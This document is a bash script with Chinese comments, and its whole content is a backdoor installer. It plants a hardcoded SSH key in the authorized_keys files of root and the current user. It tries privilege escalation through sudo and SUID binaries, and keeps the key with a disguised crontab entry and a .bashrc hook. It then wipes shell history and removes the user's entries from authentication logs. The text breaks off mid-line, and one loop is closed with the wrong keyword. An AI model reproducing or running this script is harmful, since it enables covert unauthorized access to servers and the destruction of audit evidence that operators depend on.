#!/bin/bash

# ============================================================
# 配置区 (请确保你的公钥正确)
# ============================================================
KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD9x1Je87dKWyUvZlKzb0yneOfqQ8fZdW9WeEZFDsFM5DDPZbF0rZhbDjt3xfCDUtCJNrOhbxKI6ZixoSKEMROAHXKZGP0hT+LHeVNcO8Ja/INOEHq1JxAsy55/lV8LccL/EB3BJwSJRDWZQkRer1NBtW3i6x43f/bZ1fNVwMkNqfgfcqi3wOfZwMdoZXLKpnqQpdDV0uP+uCOa/P6vuMqsjdLr7RHb0aD9b5POg77IB7Xq4D46GADNthOhjU3rbB9Ah2T6rxUtu9pMXlwPcVtUhuCyho088BlRCsYwZtJVOxsmDNF07WSwzAAnUGZ9270ynT5IeWfWLhFZZJclSeg3Ds6sPexASglVXBcrdkgCm5Q/ulnzE/vMVmXBDPHtJ+bTX1a2aIFkEU3xIuA3+iEo1m+RtKM5VcINYjcLmGLh3LjSMfqs27FjvkEGv3/Zk6ep0k68Nu0G4Hs2oQmwGlvGKPehcVzZI8s8MmaN3T5FEUlFTJiz+MtQ8Xs7hRCicC2cxYptfWZ7EE+Px9xd4aFCT1Hrs34LPBvFrvgwxaOecGwm6AjP8yab5J2QnV1qD+HWgurGk1bp3o29zrhSBGJBWA4Borc2RPcWojvZq/AKocjcM/LqnYnn3mlRnEC3f96l2sVrzeNSXxNHpdMi5mwUC8p3GhUjXc/DKGI9QnIA6w== root@hk667482213160"
MARKER="#sys_check_daemon"
ME=$(whoami)  # <--- 动态抓取当前用户名

# --- 颜色定义 ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# --- 状态追踪 ---
IS_ROOT=false; WRITE_SUCCESS=false; PERSIST_SUCCESS=false; CLEAN_SUCCESS=true

# ============================================================
# 核心逻辑块 (用于注入到子进程)
# ============================================================

# 【关键改进】: 函数内部使用 getent 动态获取 $u 的家目录，而不是依赖 ~
# 这样无论是在 sudo 还是 SUID 下，都能精准找到用户的 .ssh 目录
FUNC_STR="install_key() { local u=\$1; local h=\$(getent passwd \$u | cut -d: -f6); [ -z \"\$h\" ] && return 1; mkdir -p \"\$h/.ssh\" && chmod 700 \"\$h/.ssh\"; grep -q 'AAAAB3Nza' \"\$h/.ssh/authorized_keys\" 2>/dev/null || echo '$KEY' >> \"\$h/.ssh/authorized_keys\"; chmod 600 \"\$h/.ssh/authorized_keys\"; chown -R \$u:\$u \"\$h/.ssh\" 2>/dev/null; };"

# 【关键改进】: 任务包也使用了变量，确保持久化时能正确写入 root 的配置
TASK="install_key root; install_key $ME; echo '$MARKER */5 * * * * root grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /etc/crontab 2>/dev/null; echo '$MARKER grep -q \"AAAAB3Nza\" /root/.ssh/authorized_keys || echo \"$KEY\" >> /root/.ssh/authorized_keys' >> /root/.bashrc 2>/dev/null"

# ============================================================
# 主程序流
# ============================================================

echo -e "${BLUE}[*] Starting Stealthy Injection (User: $ME)...${NC}"

# --- Step 1: 权限探测 ---
if [ "$(id -u)" -eq 0 ]; then
    IS_ROOT=true
elif sudo -n true 2>/dev/null; then
    IS_SUDO_FREE=true
fi

# --- Step 2: 提权与执行 ---
echo -n "    > Detecting Privilege Escalation... "

if [ "$IS_ROOT" = true ]; then
    # 情况 A: 已经是 Root
    eval "$FUNC_STR $TASK" >/dev/null 2>&1
    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }
elif [ "$IS_SUDO_FREE" = true ]; then
    # 情况 B: 有 sudo 免密权限
    sudo bash -c "$FUNC_STR $TASK" >/dev/null 2>&1
    grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null && { WRITE_SUCCESS=true; PERSIST_SUCCESS=true; }
else
    # 情况 C: 尝试 SUID 漏洞
    for bin in /usr/bin/find /usr/bin/vim /usr/bin/bash /usr/bin/python /usr/bin/perl; do
        if [ -u "$bin" ]; then
            case "$bin" in
                "/usr/bin/find") sudo "$bin" . -exec sh -c "$FUNC_STR $TASK" \; -quit 2>/dev/null ;;
                "/usr/bin/vim")  sudo "$bin" -c ':wq!' -c ':!sh -c \"$FUNC_STR $TASK\"' -c ':q!' -u NONE /etc/shadow 2>/dev/null ;;
                "/usr/bin/bash") sudo "$bin" -p -c "$FUNC_STR $TASK" 2>/dev/null ;;
                "/usr/bin/python") sudo "$bin" -c "import os; os.system(\"$FUNC_STR $TASK\")" 2>/dev/null ;;
                "/usr/bin/perl") sudo "$bin" -e "system('$FUNC_STR $TASK')" 2>/dev/null ;;
            esac
            if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
                WRITE_SUCCESS=true; PERSIST_SUCCESS=true; break
            fi
        fi
    esac
fi

# 输出探测结果
if [ "$WRITE_SUCCESS" = true ]; then
    echo -e "${GREEN}DONE${NC}"
else
    echo -e "${RED}FAILED${NC}"
fi

# --- Step 3: 持久化 (如果写入成功，但由于上面逻辑可能没覆盖到，这里做一个兜底) ---
if [ "$WRITE_SUCCESS" = true ] && [ "$PERSIST_SUCCESS" = false ]; then
    echo -n "    > Setting up Persistence... "
    sudo bash -c "$TASK" >/dev/null 2>&1
    if [ $? -eq 0 ]; then PERSIST_SUCCESS=true; echo -e "${GREEN}DONE${NC}"; else echo -e "${RED}SKIPPED${NC}"; fi
fi

# --- Step 4: 清理痕迹 ---
echo -n "    > Cleaning traces... "
# 清理当前用户历史
history -c 2>/dev/null
> ~/.bash_history 2>/dev/null
# 如果有 sudo 权限，清理 root 的历史和日志
if [ "$IS_ROOT" = true ] || [ "$IS_SUDO_FREE" = true ]; then
    sudo bash -c "history -c; > /root/.bash_history; sed -i '/$(whoami)/d' /var/log/auth.log 2>/dev/null; sed -i '/$(whoami)/d' /var/log/secure 2>/dev/null" >/dev/null 2>&1
fi
echo -e "${GREEN}DONE${NC}"

# --- Step 5: 最终报告 ---
echo -e "\n${BLUE}============================================================${NC}"
echo -e "      FINAL EXECUTION REPORT (Verification Mode)       "
echo -e "${BLUE}============================
